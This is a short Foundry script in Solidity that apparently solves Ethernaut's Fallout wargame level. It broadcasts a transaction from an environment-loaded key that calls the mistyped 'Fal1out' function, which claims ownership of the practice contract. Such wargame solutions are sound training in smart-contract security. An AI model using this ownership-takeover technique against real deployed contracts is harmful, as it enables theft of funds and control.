// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallout} from "src/02/Fallout.sol";

contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL2");   
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Fallout level = Fallout(payable(address(instance)));

    function run() external {
        vm.startBroadcast(hacker);
        level.Fal1out();
        vm.stopBroadcast();
    }
}